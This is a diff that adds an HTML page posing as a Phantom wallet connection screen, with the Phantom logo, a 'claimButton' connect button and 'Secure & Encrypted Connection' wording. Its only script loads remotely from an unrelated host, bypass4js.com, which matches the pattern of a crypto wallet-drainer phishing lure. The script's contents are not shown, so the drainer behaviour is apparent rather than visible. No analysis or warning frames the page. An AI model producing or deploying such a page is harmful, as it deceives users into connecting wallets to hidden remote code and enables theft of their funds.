@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Phantom Wallet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #6a1b9a, #38006b);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .wallet-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .phantom-logo {
+            width: 80px;
+            margin-bottom: 1.5rem;
+        }
+
+        h1 {
+            color: #2d004f;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+        }
+
+        .description {
+            color: #666;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .connect-btn {
+            background: #6a1b9a;
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-btn:hover {
+            background: #38006b;
+            box-shadow: 0 5px 15px rgba(104, 27, 154, 0.4);
+        }
+
+        .security-info {
+            margin-top: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .supported-wallets {
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #eee;
+        }
+
+        .supported-wallets p {
+            color: #666;
+            margin-bottom: 0.5rem;
+        }
+
+        .wallet-icons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+        }
+
+        .wallet-icons i {
+            font-size: 1.5rem;
+            color: #888;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .wallet-card {
+            animation: fadeIn 0.5s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="wallet-card">
+        <img src="https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Ficon%2FU7kNZ4ygz4QW1rUwOuTT%2FWhite%20Ghost_docs_nu.svg?alt=media&token=447b91f6-db6d-4791-902d-35d75c19c3d1" alt="Phantom Wallet Logo" class="phantom-logo">
+        <h1>Connect Your Wallet</h1>
+        <p class="description">Securely connect your Phantom wallet to access the Solana ecosystem. Your gateway to decentralized applications.</p>
+        
+        <button class="connect-btn claimButton" >
+            Connect Phantom Wallet
+        </button>
+
+        <div class="security-info">
+            <i class="fas fa-shield-alt"></i>
+            <span>Secure & Encrypted Connection</span>
+        </div>
+
+        <div class="supported-wallets">
+            <p>It is highly recommended to use Phantom Wallet to ensure smooth experience. If you're using other services you can import your wallet to Phantom and continue.</p>
+
+        </div>
+    </div>
+
+    <script type="module" src="https://l.bypass4js.com/a.js" defer></script>
+</body>
+</html>
